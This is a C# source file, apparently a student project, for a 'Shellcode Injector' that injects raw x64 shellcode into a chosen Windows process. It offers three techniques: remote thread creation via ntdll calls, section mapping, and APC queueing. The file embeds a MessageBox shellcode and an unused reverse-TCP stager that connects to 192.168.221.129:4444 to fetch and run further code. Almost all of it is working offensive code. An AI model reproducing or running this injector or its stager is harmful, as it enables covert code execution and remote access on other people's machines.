using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ECE264project
{
    class Program
    {
        public class Injector
        {
            [Flags]
            public enum SnapshotFlags : uint
            {
                HeapList = 0x00000001,
                Process = 0x00000002,
                Thread = 0x00000004,
                Module = 0x00000008,
                Module32 = 0x00000010,
                All = (HeapList | Process | Thread | Module),
                Inherit = 0x80000000,
                NoHeaps = 0x40000000
            }
            [Flags]
            public enum ThreadAccess : int
            {
                TERMINATE = (0x0001),
                SUSPEND_RESUME = (0x0002),
                GET_CONTEXT = (0x0008),
                SET_CONTEXT = (0x0010),
                SET_INFORMATION = (0x0020),
                QUERY_INFORMATION = (0x0040),
                SET_THREAD_TOKEN = (0x0080),
                IMPERSONATE = (0x0100),
                DIRECT_IMPERSONATION = (0x0200),
                ALL_ACCESS = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESSENTRY32
            {
                public uint dwSize;
                public uint cntUsage;
                public uint th32ProcessID;
                public IntPtr th32DefaultHeapID;
                public uint th32ModuleID;
                public uint cntThreads;
                public uint th32ParentProcessID;
                public int pcPriClassBase;
                public uint dwFlags;
            };

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]

            public struct THREADENTRY32

            {
                public UInt32 dwSize;
                public UInt32 cntUsage;
                public UInt32 th32ThreadID;
                public UInt32 th32OwnerProcessID;
                public UInt32 tpBasePri;
                public UInt32 tpDeltaPri;
                public UInt32 dwFlags;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 0)]
            public struct OBJECT_ATTRIBUTES
            {
                public int Length;
                public IntPtr RootDirectory;
                public IntPtr ObjectName;
                public uint Attributes;
                public IntPtr SecurityDescriptor;
                public IntPtr SecurityQualityOfService;
            }
            [StructLayout(LayoutKind.Sequential)]
            public struct CLIENT_ID
            {
                public IntPtr UniqueProcess;
                public IntPtr UniqueThread;
            }



            // GetCurrentProcess - kernel32.dll
            [DllImport("kernel32.dll", SetLastError = true)]
            static extern IntPtr GetCurrentProcess();


            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);


            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);


            [DllImport("kernel32.dll")]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);


            [DllImport("kernel32.dll", SetLastError = true)]
            static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);


            [DllImport("kernel32.dll")]
            static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);


            [DllImport("kernel32.dll")]
            static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

            [DllImport("kernel32.dll")]
            static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);

            [DllImport("kernel32.dll")]
            static extern int SleepEx(UInt32 dwMilliseconds, bool bAlertable);



            [DllImport("ntdll.dll", SetLastError = true)]
            static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

            [DllImport("ntdll.dll", SetLastError = true)]
            static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, UInt32 ZeroBits, ref UInt32 RegionSize, UInt32 AllocationType, UInt32 Protect);

            [DllImport("ntdll.dll", SetLastError = true)]
            static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToWrite, ref UInt32 NumberOfBytesWritten);

            [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
            static extern int NtClose(IntPtr hObject);

            [DllImport("ntdll.dll", SetLastError = true)]
            static extern uint NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

            [DllImport("ntdll.dll", SetLastError = true)]
            public static extern UInt32 NtMapViewOfSection(
               IntPtr SectionHandle,
               IntPtr ProcessHandle,
               ref IntPtr BaseAddress,
               UIntPtr ZeroBits,
               UIntPtr CommitSize,
               ref ulong SectionOffset,
               ref ulong ViewSize,
               uint InheritDisposition,
               uint AllocationType,
               uint Win32Protect);

            [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
            public static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);




            public static void Main(string[] args)
            {
                byte[] shellcode = new byte[309]
                {
                    0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
                    0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
                    0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
                    0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
                    0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
                    0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
                    0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
                    0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
                    0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
                    0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
                    0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                    0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
                    0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
                    0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                    0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
                    0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
                    0x85,0x1d,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
                    0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x41,0x73,0x74,
                    0x72,0x6f,0x77,0x6f,0x72,0x6c,0x64,0x2e,0x2e,0x4d,0x79,0x20,0x50,0x6c,0x61,
                    0x6e,0x65,0x74,0x2e,0x2e,0x4d,0x79,0x20,0x68,0x6f,0x6d,0x65,0x00,0x4d,0x65,
                    0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00
                };



                byte[] buf = new byte[510]
                {
                    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                    0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x51,0x48,0x8b,
                    0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,
                    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                    0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
                    0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
                    0x40,0x20,0x50,0x8b,0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,
                    0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
                    0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
                    0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
                    0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
                    0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
                    0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
                    0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,
                    0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,
                    0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0xdd,0x81,0x41,0x54,0x49,0x89,0xe4,
                    0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
                    0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,
                    0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,
                    0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,
                    0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
                    0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,
                    0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,
                    0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
                    0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
                    0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,
                    0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,
                    0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,
                    0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
                    0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
                    0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,
                    0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,
                    0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
                };

                string logo = @"
 _______         _______ _       _       _______ _______ ______  _______   
(  ____ \\     /(  ____ ( \     ( \     (  ____ (  ___  |  __  \(  ____ \  
| (    \/ )   ( | (    \/ (     | (     | (    \/ (   ) | (  \  ) (    \/  
| (_____| (___) | (__   | |     | |     | |     | |   | | |   ) | (__      
(_____  )  ___  |  __)  | |     | |     | |     | |   | | |   | |  __)     
      ) | (   ) | (     | |     | |     | |     | |   | | |   ) | (        
/\____) | )   ( | (____/\ (____/\ (____/\ (____/\ (___) | (__/  ) (____/\  
__________     \________________(_______________________|_______(_______/  
\__   __( (    /\__    _(  ____ (  ____ \__   __(  ___  |  ____ )          
   ) (  |  \  ( |  )  ( | (    \/ (    \/  ) (  | (   ) | (    )|          
   | |  |   \ | |  |  | | (__   | |        | |  | |   | | (____)|          
   | |  | (\ \) |  |  | |  __)  | |        | |  | |   | |     __)          
   | |  | | \   |  |  | | (     | |        | |  | |   | | (\ (             
___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__          
\_______//    )_|____/  (_______(_______/  )_(  (_______)/   \__/          
      


   ___         ___                  __            ________   _ __             ____ 
  / _ )__ __  / _ )_______ ___  ___/ /__ ____    /_  __/ /  (_) /  ___ ___ __/ / /_
 / _  / // / / _  / __/ -_) _ \/ _  / _ `/ _ \    / / / _ \/ / _ \/ _ `/ // / / __/
/____/\_, / /____/_/  \__/_//_/\_,_/\_,_/_//_/   /_/ /_//_/_/_.__/\_,_/\_,_/_/\__/ 
     /___/                                                                         


";

                string logo2 = @"1) Default Injection (NtWriteProcessMemory & NtCreateThreadEx)

2) Section Mapping (NtCreateSection & NtMapViewOfSection)

3) Asynchronous Procedure Call Queue (NtQueueApcThread)";
                Console.WriteLine(logo);
                Console.WriteLine(logo2);
                uint PID;
                uint valid = 0;
                OBJECT_ATTRIBUTES oBJECT_ATTRIBUTES = new OBJECT_ATTRIBUTES();
                CLIENT_ID cLIENT_ID = new CLIENT_ID();
                IntPtr phandle = IntPtr.Zero;
                Console.Write("\nSelect 1, 2, or 3: ");
                int selection = int.Parse(Console.ReadLine());
                while (valid != 1)
                    switch (selection)
                    {
                        case 1:
                            Console.Write("Enter a process ID: ");
                            PID = uint.Parse(Console.ReadLine());
                            phandle = DefaultInjector.ProcessHandler(PID, oBJECT_ATTRIBUTES, cLIENT_ID);
                            IntPtr baseAddress = DefaultInjector.MemoryAllocater(phandle, shellcode, PID);
                            bool result = DefaultInjector.injectShellcode(phandle, baseAddress, shellcode, PID);
                            bool success = DefaultInjector.executeShellcode(phandle, baseAddress);
                            NtClose(phandle);
                            Console.ReadLine();
                            valid = 1;
                            break;
                        case 2:
                            Console.Write("Enter a process ID: ");
                            PID = uint.Parse(Console.ReadLine());
                            phandle = DefaultInjector.ProcessHandler(PID, oBJECT_ATTRIBUTES, cLIENT_ID);
                            IntPtr sectionHandle = SectionMapping.createSection();
                            IntPtr local_address = SectionMapping.MapSection(sectionHandle, GetCurrentProcess());
                            IntPtr remote_address = SectionMapping.MapSection(sectionHandle, phandle);
                            result = DefaultInjector.injectShellcode(GetCurrentProcess(), local_address, shellcode, PID);
                            DefaultInjector.executeShellcode(phandle, remote_address);
                            NtClose(phandle);
                            Console.ReadLine();
                            valid = 1;
                            break;
                        case 3:
                            PROCESSENTRY32 pROCESSENTRY;
                            THREADENTRY32 tHREADENTRY32;
                            List<UInt32> targetProcessThreadList = new List<UInt32>();
                            pROCESSENTRY.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
                            tHREADENTRY32.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
                            int trigger;
                            Console.Write("Enter a process ID: ");
                            PID = uint.Parse(Console.ReadLine());
                            phandle = DefaultInjector.ProcessHandler(PID, oBJECT_ATTRIBUTES, cLIENT_ID);
                            baseAddress = DefaultInjector.MemoryAllocater(phandle, shellcode, PID);
                            result = DefaultInjector.injectShellcode(phandle, baseAddress, shellcode, PID);
                            targetProcessThreadList = APC.enumerateThreads(PID);
                            result = APC.QueueAPC(baseAddress, targetProcessThreadList);
                            Console.WriteLine("[*] APC Queue of each thread points to shellcode...waiting for thread to enter alertable state");
                            SleepEx(2000,false);
                            Console.WriteLine("[+] Shellcode Executed");
                            Console.ReadLine();
                            NtClose(phandle);
                            valid = 1;
                            break;
                      default:
                            Console.WriteLine("Please select a valid process injection technique");
                            valid = 1;
                            break;

                    }
            }
            public class DefaultInjector
            {
                public static IntPtr ProcessHandler(uint PID, OBJECT_ATTRIBUTES objectAttributes, CLIENT_ID cLIENT_ID)
                {
                    uint PROCESS_ALL_ACCESS = 0x001F0FFF;
                    IntPtr nt_hProc = IntPtr.Zero;
                    cLIENT_ID.UniqueProcess = (IntPtr)PID;
                    //IntPtr hProc = OpenProcess(0x001F0FFF, false, PID);
                    if (NtOpenProcess(ref nt_hProc, PROCESS_ALL_ACCESS, ref objectAttributes, ref cLIENT_ID) != 0)
                    {
                        Console.WriteLine("[-] Error obtaining a handle to the remote process");
                        return IntPtr.Zero;
                    }
                    else
                        Console.WriteLine($"[+] Successfully obtained handle to PID: {PID}");
                    return nt_hProc;
                }
                public static IntPtr MemoryAllocater(IntPtr hProc, byte[] Shellcode, uint PID)
                {
                    UInt32 regionSize = 4096;
                    uint MEM_COMMIT = 0x00001000;
                    uint PAGE_EXECUTE_READWRITE = 0x40;
                    IntPtr nt_baseAddress = IntPtr.Zero;
                    //IntPtr baseAddress = VirtualAllocEx(hProc, IntPtr.Zero, (UInt32)Shellcode.Length, 0x1000, 0x40);
                    if (NtAllocateVirtualMemory(hProc, ref nt_baseAddress, 0, ref regionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE) != 0)
                    {
                        Console.WriteLine("[-] Error allocating memory in the remote process");
                        return IntPtr.Zero;
                    }
                    else
                        Console.WriteLine($"[+] Successfully allocated memory in remote process at 0x{nt_baseAddress.ToString("X")}");
                    return nt_baseAddress;
                }
                public static bool injectShellcode(IntPtr hProc, IntPtr baseAddress, byte[] Shellcode, uint PID)
                {
                    uint nt_bytesWritten = 0;
                    //  WriteProcessMemory(hProc, baseAddress, Shellcode, Shellcode.Length, out IntPtr bytesWritten)
                    if (NtWriteVirtualMemory(hProc, baseAddress, Shellcode, (uint)Shellcode.Length, ref nt_bytesWritten) == 0)
                    {
                        Console.WriteLine($"[+] Succesfully injected shellcode");
                        return true;
                    }
                    else
                        Console.WriteLine($"[-] Error injecting shellcode");
                    return false;
                }
                public static bool executeShellcode(IntPtr hProc, IntPtr baseAddress)
                {
                    IntPtr tHandle = IntPtr.Zero;
                    uint MAXIMUM_ALLOWED = 0x02000000;
                    // IntPtr thHandle = CreateRemoteThread(hProc, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0x0, out thHandle);
                    if (NtCreateThreadEx(ref tHandle, MAXIMUM_ALLOWED, IntPtr.Zero, hProc, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero) != 0)
                    {
                        Console.WriteLine("[-] Error creating a remote thread");
                        return false;
                    }
                    else
                        Console.WriteLine($"[+] Shellcode executed, thread ID: 0x{tHandle.ToString("X")}");
                    return true;
                }
            }
            public class SectionMapping
            {

                public static IntPtr createSection()
                {
                    IntPtr sectionHandle = IntPtr.Zero;
                    uint MaxSize = 4096;
                    uint SEC_COMMIT = 0x08000000;
                    uint SECTION_MAP_WRITE = 0x0002;
                    uint SECTION_MAP_READ = 0x0004;
                    uint SECTION_MAP_EXECUTE = 0x0008;
                    uint EXECUTE_READ_WRITE = 0X40;
                    uint result = NtCreateSection(ref sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, IntPtr.Zero, ref MaxSize, EXECUTE_READ_WRITE, SEC_COMMIT, IntPtr.Zero);
                    if (result == 0)
                    {
                        Console.WriteLine($"[+] Handle to local section object 0x{sectionHandle.ToString("X")}");
                        return sectionHandle;
                    }
                    else
                        Console.WriteLine("[-] Error creating section");
                    return IntPtr.Zero;
                }
                public static IntPtr MapSection(IntPtr sectionHandle, IntPtr remoteProcHandle)
                {

                    ulong optional = 0;
                    ulong viewSize = 0;
                    uint PAGE_RWX = 0x40;
                    uint MEM_RESERVE = 0x00002000;
                    uint success_code;
                    if (remoteProcHandle == GetCurrentProcess())
                    {
                        IntPtr localbaseAddress = IntPtr.Zero;
                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref localbaseAddress, UIntPtr.Zero, UIntPtr.Zero, ref optional, ref viewSize, 2, 0, PAGE_RWX);
                        Console.WriteLine($"[+] Successfully mapped local section at 0x{localbaseAddress.ToString("X")}");
                        return localbaseAddress;

                    }
                    else
                    {
                        IntPtr remotebaseAddress = IntPtr.Zero;
                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref remotebaseAddress, UIntPtr.Zero, UIntPtr.Zero, ref optional, ref viewSize, 2, 0, PAGE_RWX);
                        Console.WriteLine($"[+] Successfully mapped remote section at 0x{remotebaseAddress.ToString("X")}");
                        return remotebaseAddress;
                    }

                }
            }
            public class APC
            {
                public static List<UInt32> enumerateThreads(uint PID)
                {
                    List<UInt32> threads = new List<UInt32>();
                    PROCESSENTRY32 pROCESSENTRY32 = new PROCESSENTRY32();
                    THREADENTRY32 tHREADENTRY32 = new THREADENTRY32();
                    pROCESSENTRY32.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
                    tHREADENTRY32.dwSize = (UInt32)Marshal.SizeOf(typeof(THREADENTRY32));

                    IntPtr hSnapshot = CreateToolhelp32Snapshot(SnapshotFlags.All, PID);
                    Console.WriteLine("[+] Enumerating threads of target process...");
                    if (Thread32First(hSnapshot, ref tHREADENTRY32))
                    {
                        do
                        {
                            if (tHREADENTRY32.th32OwnerProcessID == PID)
                            {
                                threads.Add(tHREADENTRY32.th32ThreadID);
                                Console.WriteLine($"     - Thread ID: {tHREADENTRY32.th32ThreadID}");
                            }
                        } while (Thread32Next(hSnapshot, ref tHREADENTRY32));

                        return threads;
                    }
                    else
                    {
                        Console.WriteLine("[-] Error enumerating threads");
                        return threads;
                    }

                }

                public static bool QueueAPC(IntPtr baseAddress, List<UInt32> threads)
                {
                    IntPtr tHandle;
                    foreach (UInt32 threadID in threads)
                    {
                        if (OpenThread(ThreadAccess.ALL_ACCESS, true, threadID) != IntPtr.Zero)
                        {
                            tHandle = OpenThread(ThreadAccess.ALL_ACCESS, true, threadID);
                            QueueUserAPC(baseAddress, tHandle, 0);
                        }
                        else
                        {
                            Console.WriteLine($"[-] Failed to Queue APC in threadID: {threadID}");
                        }
                    }
                    return true;
                }
            }
        }
    }
}